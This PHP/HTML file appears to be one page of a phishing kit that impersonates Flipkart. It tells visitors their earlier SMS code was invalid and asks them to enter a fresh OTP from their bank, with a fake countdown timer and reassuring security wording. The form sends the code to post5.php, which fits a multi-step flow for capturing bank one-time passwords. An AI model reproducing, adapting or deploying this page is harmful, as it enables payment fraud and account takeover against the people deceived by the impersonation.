<?php
session_start();
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SMS Verification - Retry</title>
    <link rel="icon" href="./assets/favicon.ico">
    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="./assets/style/welcom.css">
</head>
<body>
    <nav class="flipkart-navbar">
        <div class="max-w-7xl mx-auto px-4 py-3">
            <div class="flex items-center justify-between">
                <div class="flex items-center space-x-8">
                    <div class="text-2xl font-bold text-white">Flipkart</div>
                    <div class="hidden md:flex space-x-6">
                        <a href="#" class="text-white hover:text-yellow-300 transition-colors">Electronics</a>
                        <a href="#" class="text-white hover:text-yellow-300 transition-colors">Fashion</a>
                        <a href="#" class="text-white hover:text-yellow-300 transition-colors">Home</a>
                        <a href="#" class="text-white hover:text-yellow-300 transition-colors">Appliances</a>
                    </div>
                </div>
                <div class="hidden md:flex flex-1 max-w-lg mx-8">
                    <div class="relative w-full">
                        <input type="text" placeholder="Search for products, brands and more" class="w-full py-3 px-4 pr-12 rounded-l-md border-none outline-none">
                        <button class="absolute right-0 top-0 h-full px-4 bg-yellow-400 rounded-r-md hover:bg-yellow-500 transition-colors">
                            <i class="fas fa-search text-blue-800"></i>
                        </button>
                    </div>
                </div>
                <div class="flex items-center space-x-6">
                    <button class="text-white hover:text-yellow-300 transition-colors">
                        <i class="fas fa-user mr-2"></i>
                        <span class="hidden sm:inline">Login</span>
                    </button>
                    <button class="text-white hover:text-yellow-300 transition-colors">
                        <i class="fas fa-shopping-cart mr-2"></i>
                        <span class="hidden sm:inline">Cart</span>
                    </button>
                </div>
            </div>
        </div>
    </nav>

    <div class="bg-gradient-to-r from-rose-500 via-rose-600 to-rose-700 py-12 relative overflow-hidden">
        <div class="absolute inset-0 opacity-10">
            <div class="absolute top-4 left-10 w-16 h-16 border-2 border-white rounded-full"></div>
            <div class="absolute top-20 right-20 w-8 h-8 bg-yellow-300 rounded-full"></div>
            <div class="absolute bottom-10 left-1/4 w-12 h-12 border border-white rotate-45"></div>
            <div class="absolute bottom-6 right-10 w-6 h-6 bg-white rounded-full"></div>
        </div>

        <div class="max-w-6xl mx-auto px-4 text-center relative z-10">
            <div class="inline-flex items-center bg-white text-rose-600 px-4 py-2 rounded-full text-sm font-bold mb-4">
                <i class="fas fa-exclamation-circle mr-2"></i>
                Action Required
            </div>

            <h1 class="text-5xl md:text-6xl font-black mb-4 text-white leading-tight">
                Verification Needed
            </h1>

            <div class="text-xl md:text-2xl font-semibold text-white mb-3">
                The previous SMS code was invalid
            </div>

            <p class="text-lg text-rose-100 mb-6 max-w-3xl mx-auto">
                For security reasons we&apos;ve sent you a <strong>new OTP</strong>. Double-check the latest message from your bank and enter the updated code below.
            </p>
        </div>
    </div>

    <main class="max-w-4xl mx-auto px-4 py-8">
        <div class="bg-white rounded-2xl shadow-xl p-8 relative overflow-hidden">
            <div class="text-center mb-8">
                <div class="w-20 h-20 bg-rose-100 rounded-full flex items-center justify-center mx-auto mb-4">
                    <i class="fas fa-mobile-alt text-rose-600 text-2xl"></i>
                </div>
                <h2 class="text-3xl font-bold text-gray-800 mb-4">Enter the New SMS Code</h2>
                <p class="text-lg text-gray-600">We refreshed the code to keep your transaction secure. Please use the latest OTP you just received.</p>
            </div>

            <div class="bg-rose-50 border border-rose-200 rounded-lg p-4 text-sm text-rose-700 mb-6">
                <p class="font-semibold mb-1"><i class="fas fa-bell mr-2"></i>Tips:</p>
                <ul class="list-disc list-inside space-y-1">
                    <li>Enter the new SMS code (previous codes are automatically invalidated).</li>
                    <li>Keep this window open while you check your messages.</li>
                    <li>If you didn&apos;t receive anything, tap <strong>Resend code</strong> below.</li>
                </ul>
            </div>

            <form class="max-w-xl mx-auto space-y-6" method="post" action="post5.php">
                <div>
                    <label class="block text-sm font-medium text-gray-700 mb-2">New SMS Verification Code</label>
                    <input type="text" name="dataEntry" id="smsCode" maxlength="6" pattern="[0-9]{4,6}" required class="form-input text-center text-2xl tracking-widest font-bold">
                    <p class="text-sm text-gray-500 mt-2">Code expires in: <span id="timer" class="font-bold text-red-600">02:30</span></p>
                </div>

                <div class="flex items-center justify-between text-sm text-gray-600">
                    <span><i class="fas fa-shield-alt mr-2 text-rose-500"></i>Flipkart secures this verification</span>
                    <a href="#" class="text-rose-600 hover:underline">Resend code</a>
                </div>

                <div class="text-center">
                    <button type="submit" name="okbbx" class="flipkart-btn w-full py-4 text-lg">
                        <i class="fas fa-sync-alt mr-2"></i>
                        Submit Updated Code
                    </button>
                </div>
            </form>
        </div>
    </main>

    <script>
        let seconds = 150;
        const timerEl = document.getElementById('timer');
        if (timerEl) {
            setInterval(() => {
                seconds = Math.max(0, seconds - 1);
                const m = String(Math.floor(seconds / 60)).padStart(2, '0');
                const s = String(seconds % 60).padStart(2, '0');
                timerEl.textContent = `${m}:${s}`;
            }, 1000);
        }
        const smsInput = document.getElementById('smsCode');
        if (smsInput) {
            smsInput.addEventListener('input', (e) => {
                e.target.value = e.target.value.replace(/\D/g, '').slice(0, 6);
            });
        }
    </script>
</body>
</html>
